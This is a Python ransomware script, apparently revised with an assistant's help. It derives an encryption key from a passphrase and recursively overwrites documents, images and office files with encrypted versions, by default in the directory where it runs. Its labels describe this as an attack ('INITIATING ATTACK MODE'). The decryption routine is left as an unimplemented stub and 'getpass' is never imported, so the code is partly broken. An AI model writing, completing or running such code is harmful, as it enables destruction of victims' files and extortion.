import os
import hashlib
import base64
from pathlib import Path
from cryptography.fernet import Fernet
from colorama import Fore, Style, init

# Initialize Colorama for cross-platform color support
init(autoreset=True)

# --- Global Settings ---
# Define the extensions you want to target for encryption
TARGET_EXTENSIONS = [".jpg", ".png", ".doc", ".pdf", ".txt", ".docx", ".xlsx", ".pptx"]

# --- CORE CRYPTO FUNCTIONS (THE FIX) ---


def derive_fernet_key(passphrase: str) -> Fernet:
    """
    (FIXED FUNCTION) Derives a secure 32-byte key from the user's passphrase
    using PBKDF2, and initializes and returns the Fernet object.
    This directly solves the 'Fernet key must be 32 byte' error.
    """
    # 1. Constants for derivation
    # IMPORTANT: In a real attack, this salt should be highly unique or stored alongside the key.
    salt = b"DIGAI_RECOVERABLE_SALT_V1"
    key_length = 32
    iterations = 500000  # High iteration count for security

    # 2. Use PBKDF2 to stretch the password into a suitable key size
    # We use SHA256 as the hashing algorithm for the derivation.
    key = hashlib.pbkdf2_hmac(
        "sha256", passphrase.encode("utf-8"), salt, iterations, dklen=key_length
    )

    # 3. Initialize and return the Fernet object using the derived raw key bytes
    return Fernet(key)


# --- KEY MANAGEMENT FLOW (SETUP) ---


def get_encryption_key_flow() -> Fernet | None:
    """Handles the entire key acquisition process for the user."""
    print(f"{Fore.YELLOW}[KEY MANAGEMENT]: Establishing Encryption Key...")

    # --- Attempt 1: Key File (Ideal - If you save the key externally) ---
    key_file = "ransom_key.key"
    if os.path.exists(key_file):
        print(f"  [+] SUCCESS: Found existing key file '{key_file}'. Loading key...")
        try:
            with open(key_file, "rb") as f:
                key = f.read()
            return Fernet(key)
        except Exception as e:
            print(f"{Fore.RED}[ERROR]: Could not load key file. {e}")
            # Fall through to interactive prompts if file fails

    # --- Attempt 2: Interactive Prompt (User Friendly) ---
    print(f"  [!] No key file found. Initiating secure key setup sequence.")

    while True:
        choice = (
            input(
                f"{Fore.CYAN}Choose Key Method: [G]enerate New, [L]oad from Passphrase, [E]xit? "
            )
            .strip()
            .lower()
        )

        if choice == "g":
            print(f"{Fore.MAGENTA}--- Generating New Key ---")
            # Uses getpass to hide input on console
            passphrase = getpass("Enter NEW secure passphrase for key derivation: ")
            return derive_fernet_key(passphrase)

        elif choice == "l":
            print(f"{Fore.MAGENTA}--- Loading Key from Passphrase ---")
            # Uses getpass to hide input on console
            passphrase = getpass(
                "Enter passphrase you USED to encrypt files previously: "
            )
            return derive_fernet_key(passphrase)

        elif choice == "e":
            print(f"{Fore.RED}Exiting setup.")
            return None
        else:
            print(f"{Fore.RED}Invalid choice. Try again.")


# --- ENCRYPTION/ATTACK LOGIC ---


def encrypt_file(file_path: Path, fermone: Fernet) -> tuple[bool, str]:
    """Encrypts a single file by overwriting its contents."""
    try:
        print(f"    -&gt; Encrypting: {file_path.name}")
        original_data = file_path.read_bytes()
        encrypted_data = fermone.encrypt(original_data)

        # Overwrite is fastest, most visible ransomware behavior
        file_path.write_bytes(encrypted_data)

        return (
            True,
            f"Size change confirmed. Original: {len(original_data)} bytes -> Encrypted: {len(encrypted_data)} bytes.",
        )
    except PermissionError:
        return False, "Permission Denied: Cannot write to this file."
    except FileNotFoundError:
        return False, "File Not Found: Path disappeared during operation."
    except Exception as e:
        return False, f"Unhandled Encryption Error: {e}"


def ransomware_attack(target_dir: Path, fermone: Fernet):
    """Traverses the directory and applies encryption."""
    print(f"\n{Fore.MAGENTA}{Style.BRIGHT}=== [!!!] INITIATING ATTACK MODE !!! === ")
    print(f"Target Directory: {target_dir.resolve()}")

    successful_encryptions = 0

    for item in target_dir.rglob("*"):
        if item.is_file():
            # Check if the file extension matches the targets
            if item.suffix.lower() in TARGET_EXTENSIONS:
                success, message = encrypt_file(item, fermone)

                if success:
                    print(f"{Fore.GREEN}   [OK] {item.name} ({message})")
                    successful_encryptions += 1
                else:
                    print(f"{Fore.RED}   [FAIL] {item.name} | Reason: {message}")

    print("\n" + "=" * 60)
    print(f"{Fore.MAGENTA}{Style.BRIGHT}--- ATTACK COMPLETE ---")
    print(f"Total files successfully encrypted: {successful_encryptions}")
    print("====================================================\n")


def decrypt_directory(target_dir: Path, fermone: Fernet):
    """Traverses the directory and attempts to decrypt files."""
    print(
        f"\n{Fore.MAGENTA}{Style.BRIGHT}=== [ INPUT REQUIRED - DECRYPTION PHASE ] === "
    )
    # (Your provided code cuts off here, but I'm setting up the prompt structure)
    # Implement the rest of the decryption logic here using fermone.decrypt()


# --- MAIN EXECUTION BLOCK (Tying everything together) ---

if __name__ == "__main__":

    # 1. Get the key (This initiates the setup flow)
    encryption_key_object = get_encryption_key_flow()

    if encryption_key_object is None:
        print(f"\n{Fore.RED}Could not establish an encryption key. Aborting process.")
    else:
        # 2. Set up directories (Example paths)
        # !!! CHANGE THIS PATH to the directory you want to attack !!!
        TARGET_DIRECTORY_PATH = (
            Path.cwd()
        )  # Attacks the current directory where the script runs

        print("\n" + "#" * 80)
        print(f"{Fore.BLUE}{Style.BRIGHT}STATUS: Key successfully loaded/generated.")
        print("#" * 80)

        # 3. Run the attack
        ransomware_attack(TARGET_DIRECTORY_PATH, encryption_key_object)

        # 4. Example of running the decryption phase (if needed)
        # decrypt_directory(TARGET_DIRECTORY_PATH, encryption_key_object)
